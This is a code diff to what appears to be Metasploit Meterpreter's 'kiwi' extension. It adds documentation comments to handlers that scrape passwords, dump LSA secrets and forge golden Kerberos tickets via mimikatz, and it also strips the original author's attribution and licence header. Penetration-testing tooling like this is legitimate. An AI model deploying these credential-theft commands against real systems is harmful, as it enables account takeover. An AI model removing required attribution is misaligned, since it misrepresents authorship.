@@ -1,13 +1,12 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
-*/
+/*!
+ * @file main.c
+ * @brief Entry point for the kiwi extension.
+ */
 
 #include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
-	// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
-	// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
-	// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
+// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
+// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
+// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
 #include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
 // this sets the delay load hook function, see DelayLoadMetSrv.h
@@ -23,6 +22,7 @@ DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet);
 DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet);
 DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
 
+/*! @brief The enabled commands for this extension. */
 Command customCommands[] =
 {
     COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
@@ -34,6 +34,12 @@ Command customCommands[] =
     COMMAND_TERMINATOR
 };
 
+/*!
+ * @brief Handler for the lsa dump secrets message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
 {
 	DWORD result;
@@ -47,6 +53,12 @@ DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
+/*!
+ * @brief Handler for the use kerberos ticket message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
@@ -70,6 +82,12 @@ DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
 	return result;
 }
 
+/*!
+ * @brief Handler for the create golden kerberos ticket message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet)
 {
 	DWORD result;
@@ -94,6 +112,12 @@ DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
+/*!
+ * @brief Handler for the list kerberos tickets message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet)
 {
 	DWORD result;
@@ -107,6 +131,12 @@ DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
+/*!
+ * @brief Handler for the purge current kerberos tickets message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet)
 {
 	DWORD result = mimikatz_kerberos_ticket_purge();
@@ -118,6 +148,12 @@ DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
+/*!
+ * @brief Handler for the password scraping message.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the incoming packet.
+ * @returns \c ERROR_SUCCESS
+ */
 DWORD request_scrape_passwords(Remote *remote, Packet *packet)
 {
 	DWORD result;
@@ -132,15 +168,17 @@ DWORD request_scrape_passwords(Remote *remote, Packet *packet)
 	return ERROR_SUCCESS;
 }
 
-/*
- * Initialize the server extension
+/*!
+ * @brief Initialises the server extension.
+ * @param remote Pointer to the \c Remote instance.
+ * @returns \c ERROR_SUCCESS
  */
 DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 {
 	hMetSrv = remote->hMetSrv;
 
 	dprintf("[KIWI] Init server extension - initorclean");
-	mimikatz_initOrClean(TRUE);
+	mimikatz_init_or_clean(TRUE);
 
 	dprintf("[KIWI] Init server extension - register");
 	command_register_all(customCommands);
@@ -150,12 +188,14 @@ DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 	return ERROR_SUCCESS;
 }
 
-/*
- * Deinitialize the server extension
+/*!
+ * @brief Deinitialises the server extension.
+ * @param remote Pointer to the \c Remote instance.
+ * @returns \c ERROR_SUCCESS
  */
 DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 {
-	mimikatz_initOrClean(FALSE);
+	mimikatz_init_or_clean(FALSE);
 	command_deregister_all(customCommands);
 
 	return ERROR_SUCCESS;
